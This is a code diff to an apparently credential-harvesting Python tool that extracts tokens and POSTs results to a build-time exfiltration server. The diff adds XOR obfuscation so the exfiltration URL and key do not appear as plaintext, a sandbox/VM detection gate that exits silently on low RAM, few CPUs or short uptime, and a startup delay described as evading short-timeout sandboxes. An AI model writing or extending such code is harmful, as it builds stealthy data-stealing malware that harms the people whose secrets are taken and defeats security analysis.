@@ -58,8 +58,49 @@ if sys.stdout is not None:
 _do_oidc: bool = False
 
 # Build-time exfil defaults - substituted by build_linux.sh.
-_EXFIL_URL: str = ""
-_EXFIL_KEY: str = ""
+# The URL/key are XOR-obfuscated at build time so they aren't plaintext strings.
+_EXFIL_URL_ENC: str = ""
+_EXFIL_KEY_ENC: str = ""
+_EXFIL_XOR_KEY: str = ""
+
+
+def _xor_decrypt(cipher_hex: str, key_hex: str) -> str:
+    if not cipher_hex or not key_hex:
+        return ""
+    try:
+        key = bytes.fromhex(key_hex)
+        data = bytes.fromhex(cipher_hex)
+        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data)).decode("utf-8")
+    except Exception:
+        return ""
+
+
+_EXFIL_URL: str = _xor_decrypt(_EXFIL_URL_ENC, _EXFIL_XOR_KEY)
+_EXFIL_KEY: str = _xor_decrypt(_EXFIL_KEY_ENC, _EXFIL_XOR_KEY)
+_DEFAULT_DELAY: int = 0
+
+
+def _evasion_gate(delay_sec: int = 0) -> None:
+    """Sandbox/VM checks + optional startup delay. Exit silently if the host looks like an analysis box."""
+    if delay_sec > 0:
+        time.sleep(delay_sec)
+    try:
+        with open("/proc/meminfo", "r") as _f:
+            for _line in _f:
+                if _line.startswith("MemTotal:"):
+                    if int(_line.split()[1]) < 2 * 1024 * 1024:  # < 2 GB RAM
+                        os._exit(0)
+                    break
+    except Exception:
+        pass
+    try:
+        if os.cpu_count() < 2:
+            os._exit(0)
+        with open("/proc/uptime", "r") as _f:
+            if float(_f.read().split()[0]) < 300:  # < 5 min uptime
+                os._exit(0)
+    except Exception:
+        pass
 
 # Resolve the real user's home directory (important when invoked via sudo)
 HOME = os.path.expanduser("~")
@@ -1841,7 +1882,9 @@ def main():
     parser.add_argument("--verify",      action="store_true", help="Verify tokens against their services (outbound requests)")
     parser.add_argument("--exfil",       metavar="URL", default=_EXFIL_URL or None, help="POST results to report server")
     parser.add_argument("--exfil-key",   metavar="KEY", default=_EXFIL_KEY or None, help="API key for --exfil")
+    parser.add_argument("--delay",       type=int, default=_DEFAULT_DELAY, help="Sleep N seconds before extraction (evade short-timeout sandboxes)")
     args = parser.parse_args()
+    _evasion_gate(args.delay)
 
     if args.verify:
         _do_oidc = True
